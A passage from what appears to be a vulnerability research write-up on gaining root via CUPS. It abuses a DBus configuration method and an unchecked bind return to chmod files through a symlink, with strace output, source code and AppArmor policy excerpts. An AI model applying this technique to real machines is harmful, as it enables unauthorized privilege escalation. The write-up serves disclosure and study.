style="color:#ecc48d">&#x27;dnssd&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span> </span><span style="color:#ecc48d">&#x27;DefaultAuthType&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;Basic&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span> </span><span style="color:#ecc48d">&#x27;ErrorPolicy&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;retry-job&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span> </span><span style="color:#ecc48d">&#x27;IdleExitTimeout&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;60&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span> </span><span style="color:#ecc48d">&#x27;JobPrivateAccess&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;default&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span> </span><span style="color:#ecc48d">&#x27;JobPrivateValues&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;default&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span> </span><span style="color:#ecc48d">&#x27;MaxLogSize&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;0&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span> </span><span style="color:#ecc48d">&#x27;PageLogFormat&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span> </span><span style="color:#ecc48d">&#x27;SubscriptionPrivateAccess&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;default&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span> </span><span style="color:#ecc48d">&#x27;SubscriptionPrivateValues&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;default&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span> </span><span style="color:#ecc48d">&#x27;WebInterface&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;Yes&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span> </span><span style="color:#ecc48d">&#x27;_debug_logging&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;0&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span> </span><span style="color:#ecc48d">&#x27;_remote_admin&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;0&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span> </span><span style="color:#ecc48d">&#x27;_remote_any&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;0&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span> </span><span style="color:#ecc48d">&#x27;_share_printers&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;0&#x27;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span> </span><span style="color:#ecc48d">&#x27;_user_cancel_any&#x27;</span><span>: </span><span style="color:#ecc48d">&#x27;0&#x27;</span><span>}</span></code></pre></div><p>Most of these values (those not starting with an underscore) match what can be seen in the cups configuration file <code>/etc/cups/cupsd.conf</code>. By changing some of these values and observing the contents of the cups configuration file we can confirm that we are successfully changing these items, and they are taking effect. Great! This is a privileged action and a privileged configuration file, by default a normal user can’t even read the file so it must be juicy, right?</p><p>A quick spin around the <a href="https://www.cups.org/doc/man-cupsd.conf.html" rel="noopener noreferrer" target="_blank"><u>man page</u></a> doesn’t turn up anything interesting unfortunately. Nothing so easy as “please run this command as root when you start”. However, we still have some options. The next step is to look for what our strace has turned up during this process. My first instincts are always to look for potentially unsafe handling of configuration values that we’ve provided, or other sections of the code that we can influence. With this in mind we can do some quick greps for key syscalls like <code>chmod</code>, <code>chown</code>, and <code>execve</code> to investigate further behavior.</p><p>Generally we’re looking for things that could potentially be influenced by the configuration file we have partial control over. After searching we can come across this strace snippet:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>unlink(</span><span style="color:#ecc48d">&quot;/var/run/cups/cups.sock&quot;</span><span>)       = -</span><span style="color:#F78C6C">1</span><span> ENOENT (No such file or directory)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>umask(</span><span style="color:#F78C6C">000</span><span>)                              = </span><span style="color:#F78C6C">022</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span>bind(</span><span style="color:#F78C6C">8</span><span>&lt;UNIX-STREAM:[</span><span style="color:#F78C6C">120796</span><span>]&gt;, {sa_family=AF_UNIX, sun_path=</span><span style="color:#ecc48d">&quot;/var/run/cups/cups.sock&quot;</span><span>}, </span><span style="color:#F78C6C">26</span><span>) = </span><span style="color:#F78C6C">0</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>umask(</span><span style="color:#F78C6C">022</span><span>)                              = </span><span style="color:#F78C6C">000</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>chmod(</span><span style="color:#ecc48d">&quot;/var/run/cups/cups.sock&quot;</span><span>, </span><span style="color:#F78C6C">0140777</span><span>) = </span><span style="color:#F78C6C">0</span></code></pre></div><p>We know from when we validated our previous assumptions against the <code>cupsd</code> configuration file that <code>/var/run/cups/cups.sock</code> is defined as a “Listen” argument. So, we can potentially control the value used in these syscalls here. My initial reaction is that there is a race condition here. The <code>chmod</code> call does not happen against a file descriptor, so there is a small window between the bind call and the <code>chmod</code> call where the socket could be swapped out for a symbolic link, allowing for arbitrary <code>chmod</code>. A <code>chmod</code> of 0140777 (essentially the same as <code>chmod 777</code>) will set the target of the call to be readable and writable by all users on the system. Since the <code>cupsd</code> process runs as root, this is potentially a very useful exploitation gadget, as we could (for example) set <code>/etc/passwd</code> to be world-writable and change our user id to 0, effectively making us root!</p><p>If we look up this specific functionality in cups we can see the following snippet from <code>cups/cups/http-addr.c</code>:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>    </span><span style="color:#637777;font-style:italic">// Remove any existing domain socket file...</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>    unlink(addr-&gt;un.sun_path);
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>    </span><span style="color:#637777;font-style:italic">// Save the current umask and set it to 0 so that all users can access</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>    </span><span style="color:#637777;font-style:italic">// the domain socket...</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span>    mask = umask(</span><span style="color:#F78C6C">0</span><span>);
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span>    </span><span style="color:#637777;font-style:italic">// Bind the domain socket...</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span>    status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr));
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span>    </span><span style="color:#637777;font-style:italic">// Restore the umask and fix permissions...</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span>    umask(mask);
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span>    chmod(addr-&gt;un.sun_path, </span><span style="color:#F78C6C">0140777</span><span>);</span></code></pre></div><p>Notice that the return values to neither unlink nor bind are checked until <em>after</em> the <code>chmod</code> call is executed (omitted, <code>status</code> is checked later). The <code>bind</code> system call doesn’t like symlinks, so if there is one present at the provided path, the bind will fail. My assumption, based on previous experience and the <code>strace</code> output, was that the bind call return value would be checked, and if there was a symlink present, <code>cupsd</code> would quit with an error. But this was not the case in the code, so we could have our malicious symlink in place well before the call to bind and still get to the chmod call. This changes our initial assumption of a race condition into a vulnerability caused by not checking return values.</p><p>Eagle-eyed readers may also question the call to unlink and ask why that wouldn’t still make this a race condition. Whilst this may look like a major hurdle (and a return of the race condition), we will see shortly why this is not the case.</p><p>So, where are we now? We have found a method on the DBus interface which allows us to set arguments in the <code>cupsd.conf</code> configuration file, cups is then restarted and our configuration should take effect. We’ve also found some potentially unsafe handling of the Listen argument. We know that this is not a race condition.</p><p>So we can call our identified method, set Listen to a symlink to something interesting, and have write access to whatever we like now? To test this, we’ll create a new directory in <code>/tmp</code>, and add a symlink to <code>/etc/passwd</code> as our sample target. We can then call the DBus method and set Listen to this path (<code>/tmp/stage/passwd</code>). Unfortunately, this does not work:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>unlink(</span><span style="color:#ecc48d">&quot;/tmp/stage/passwd&quot;</span><span>)             = -</span><span style="color:#F78C6C">1</span><span> EACCES (Permission denied)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>umask(</span><span style="color:#F78C6C">000</span><span>)                              = </span><span style="color:#F78C6C">022</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span>bind(</span><span style="color:#F78C6C">6</span><span>&lt;UNIX-STREAM:[</span><span style="color:#F78C6C">125588</span><span>]&gt;, {sa_family=AF_UNIX, sun_path=</span><span style="color:#ecc48d">&quot;/tmp/stage/passwd&quot;</span><span>}, </span><span style="color:#F78C6C">20</span><span>) = -</span><span style="color:#F78C6C">1</span><span> EADDRINUSE (Address already </span><span style="color:#c792ea;font-style:italic">in</span><span> use)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>umask(</span><span style="color:#F78C6C">022</span><span>)                              = </span><span style="color:#F78C6C">000</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>chmod(</span><span style="color:#ecc48d">&quot;/tmp/stage/passwd&quot;</span><span>, </span><span style="color:#F78C6C">0140777</span><span>)     = -</span><span style="color:#F78C6C">1</span><span> EACCES (Permission denied)</span></code></pre></div><p>This is unexpected. <code>cupsd</code> is running as root, and it even has <code>CAP_DAC_OVERRIDE</code>. Why can’t we remove a file (the <code>unlink</code> system call) owned by a normal user, let alone run <code>chmod</code> for our own file? (<code>/etc/passwd</code> is owned by root)</p><h2>Linux AppArmor</h2><p>The answer lies in AppArmor.</p><h3>What is AppArmor</h3><p>AppArmor is a Linux kernel security module that can restrict contained programs to only a specific set of resources. Similar to SELinux, AppArmor can be used to define profiles which an application will be executed with, and this profile specifies an allow and deny list of resources which the application can interact with.</p><p>A profile looks something like the following excerpt, taken from the <code>tcpdump</code> profile on my Ubuntu test machine:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>profile tcpdump /usr/bin/tcpdump {
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span>[...]
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span>  # </span><span style="color:#c792ea;font-style:italic">for</span><span> -z
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span>  /{usr/,}bin/gzip ixr,
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>  </span><span style="color:#5ca7e4">/{usr/</span><span>,}bin/bzip2 ixr,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span><span>  # </span><span style="color:#c792ea;font-style:italic">for</span><span> -F and -w
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span>  audit deny @{HOME}/.* mrwkl,
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span>  audit deny @{HOME}/.*/ rw,
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">10</span><span>  audit deny @{HOME}/.*</span><span style="color:#637777;font-style:italic">/** mrwkl,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">11</span>  audit deny @{HOME}/bin/ rw,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">12</span>  audit deny @{HOME}/bin/** mrwkl,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">13</span>  owner @{HOME}/ r,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">14</span>  owner @{HOME}/** rw,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">15</span>
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">16</span>  # for -r, -F and -w
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">17</span>  /**.[pP][cC][aA][pP] rw,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">18</span>  /**.[pP][cC][aA][pP][nN][gG] rw,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">19</span>  /**.[cC][aA][pP] rw,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">20</span>[...]
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">21</span>}</span></code></pre></div><p>This profile will restrict what files any <code>tcpdump</code> process can access. For example, we can see that it is only allowed to execute (the <code>ixr</code> flag) a certain list of binaries (<code>gzip</code>, <code>bzip2</code>). We can also see that it is not allowed to access hidden files and directories in any user’s home directory but is explicitly allowed to write to directories owned by the user under which <code>tcpdump</code> is executing. Finally, we can see that the process is only allowed to write files outside of the home directory if the file extension is <code>.pcap</code> or similar. We can see this in action in the following snippet. Observe that, even though <code>/dev/shm</code> is world writable, <code>tcpdump</code> cannot write to this directory unless the file extension ends with a <code>pcap</code> extension.</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>$ ls -ld /dev/shm
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>drwxrwxrwt </span><span style="color:#F78C6C">2</span><span> root root </span><span style="color:#F78C6C">40</span><span> May </span><span style="color:#F78C6C">10</span><span> </span><span style="color:#F78C6C">13</span><span>:</span><span style="color:#F78C6C">59</span><span> /dev/shm
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span>$ sudo tcpdump -i lo -w /dev/shm/test
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span></span><span style="color:#7fdbca">tcpdump</span><span>: </span><span style="color:#5ca7e4">/dev/</span><span>shm/test: Permission denied
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span>$ sudo tcpdump -i lo -w /dev/shm/test.pcap
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span></span><span style="color:#7fdbca">tcpdump</span><span>: listening on lo, link-type EN10MB (Ethernet), snapshot length </span><span style="color:#F78C6C">262144</span><span> bytes</span></code></pre></div><h3>Linux AppArmor, savior, and saboteur</h3><p>Now that we’ve had a quick introduction to AppArmor, how does it apply to our cups vulnerability? We can see in <code>/etc/apparmor.d/usr.sbin.cupsd</code> that <code>cupsd</code> has its own profile.</p><p>There are two parts that we can attribute to the behavior of the strace output we observed earlier. Firstly, we can see that the policy imports <code>abstractions/user-tmp</code>. The abstractions folder contains a number of partial policies which are generic and can be reused. In this file, we can see the following snippet:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>  owner /tmp</span><span style="color:#637777;font-style:italic">/**         rwkl,
</span><span style="color:#637777;font-style:italic"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span>  /tmp/                 rw,</span></code></pre></div><p>What this policy means is that <code>cupsd</code> has read and write access to the directory path at <code>/tmp</code> but only has read and write (and <code>lock</code> and <code>link</code>) access to subdirectories of <code>/tmp</code> <em>if it is the owner of the subdirectory</em>. Since our testing directory <code>/tmp/stage</code> is owned by my user and not root, <code>cupsd</code> is not allowed to make changes to this directory — so, the system call to <code>unlink</code> fails. This is a very convenient case of a security control actually <em>helping</em> with exploitation, as without this restriction, the code we’ve identified as vulnerable would actually be a race condition as discussed above, but as it stands, because the <code>unlink</code> fails, there is no timing element.</p><p>The second part of the policy impacting our proof of concept is the lack of write access to <code>/etc</code>. This is why our <code>chmod /etc/passwd</code> attempt (via the symlink) is failing. This makes a lot of sense, because there’s no need for cups to be able to write to <code>/etc</code>, so why give it the opportunity?</p><p>We now have established why our proof of concept has failed. But all is not lost. We can use the AppArmor policy as an instruction manual for things that we know we <em>could</em> successfully chmod and gain write access to. By reading through the policy, we can see that most of the places we have write access to are specific to the cupsd functionality, such as the following snippet, giving us full access to everything under <code>/etc/cups</code>.</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>  /etc/cups/ rw,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>  </span><span style="color:#5ca7e4">/etc/</span><span>cups</span><span style="color:#637777;font-style:italic">/** rw,</span></code></pre></div><h2>Pivot, pivooot</h2><p>We’ve gone from what looked like a very easy-to-exploit vulnerability to something that has quite a limited impact. Looking at the AppArmor policy, we can only really make changes to cups configuration, cache, or log files. We will somehow need to find a method to turn arbitrary control over all of the cups configuration files into something more interesting, our aim being full root command execution.</p><p>To decide what we can achieve with what we have so far, the first port of call is the documentation for the files we think we can take over. This will include <code>cupsd.conf</code>, <code>cups-files.conf</code>, and a handful of other files in <code>/etc/cups</code>. Reading through the documentation for files we come across two interesting snippets from the <a href="https://www.cups.org/doc/man-cups-files.conf.html" rel="noopener noreferrer" target="_blank"><u>cups-files.conf</u></a> man page:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>Group group-name-or-number
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>        Specifies the group name or ID that will be used when executing external programs.         The </span><span style="color:#c792ea;font-style:italic">default</span><span> group is operating system specific but is usually </span><span style="color:#ecc48d">&quot;lp&quot;</span><span> or </span><span style="color:#ecc48d">&quot;nobody&quot;</span><span>.
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>User username
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>        Specifies the user name or ID that is used when running external programs. The       </span><span style="color:#c792ea;font-style:italic">default</span><span> is </span><span style="color:#ecc48d">&quot;lp&quot;</span><span>.</span></code></pre></div><p>This sounds very interesting, as it allows for the specification of a user used for external programs. To actually try this out, however, we do need to exploit our vulnerability above to have a successful chmod against <code>/etc/cups/cups-files.conf</code>. There is a bit of hidden complexity in exploitation that hasn’t come up yet. When using the DBus <code>ServerSetSettings</code> method to change the Listen parameter, cups will no longer run properly. It will successfully execute the <code>chmod</code> call as we saw above, but because the bind call is unsuccessful, when the bind return value is checked later in the code cups will identify that the bind failed and exit. In this state, we’re not able to make any more changes, and, critically, we’re not able to exploit the vulnerability again.</p><p>To mitigate this, we can target <code>/etc/cups/cupsd.conf</code> <em>first</em>. Our attack will progress, this file will become world writable, and we can fix our inserted malicious Listen lines to be like the original lines — in essence turning our somewhat limited control of this file via DBus into full control. This will allow <code>cupsd</code> to successfully start again*, but <code>cupsd.conf</code> will remain world writable. Once in this state, we can add more Listen lines to the end of <code>cupsd.conf</code> (as <code>cupsd</code> will accept multiple of these lines) and trigger a restart of the cupsd service (by using <code>ServerSetSettings</code> on an unrelated and safe configuration item). We can now safely re-exploit the vulnerability whenever we like without losing access to <code>cupsd</code>, or breaking the <code>org.opensuse.CupsPkHelper</code> interface (which requires cups to be functional and listening at an expected location).</p><p>Using this we can then make <code>/etc/cups/cups-files.conf</code> world writable, and now we can add our own ‘User’ and ‘Group’ configuration lines we identified in the configuration documentation.</p><p><em>*Starting stopped services is generally a privileged action. However, </em><code><em>cupsd</em></code><em> is a special case because it’s configured to be “socket activated” by default, so by attempting to communicate with </em><code><em>cupsd</em></code><em> where systemd thinks the socket is (our interference notwithstanding), systemd will happily start </em><code><em>cupsd</em></code><em> for us, without the need for any extra privileges.</em></p><h2>Be who you wanna be</h2><p>We have identified that we can set the User and Group for “external programs”. Naively, we would like to set the <code>User</code> and <code>Group</code> to root, giving us root access immediately (when we can control “external programs”). However, if we try to set the User/Group lines to this in the configuration file and trigger a restart of cups, we’ll get the following error.</p><p>From the source code of <code>cups/scheduler/conf.c</code>:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>	  </span><span style="color:#c792ea;font-style:italic">if</span><span> (!p-&gt;pw_uid)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>	  {
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span>	    cupsdLogMessage(CUPSD_LOG_ERROR,
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>	                    </span><span style="color:#ecc48d">&quot;Will not use User %s (UID=0) as specified on line &quot;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>			    </span><span style="color:#ecc48d">&quot;%d of %s for security reasons.  You must use a &quot;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span>			    </span><span style="color:#ecc48d">&quot;non-privileged account instead.&quot;</span><span>,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>	                    value, linenum, CupsFilesFile);
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span>	    </span><span style="color:#c792ea;font-style:italic">if</span><span> (FatalErrors &amp; CUPSD_FATAL_CONFIG)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span>	      </span><span style="color:#c792ea;font-style:italic">return</span><span> (</span><span style="color:#F78C6C">0</span><span>);
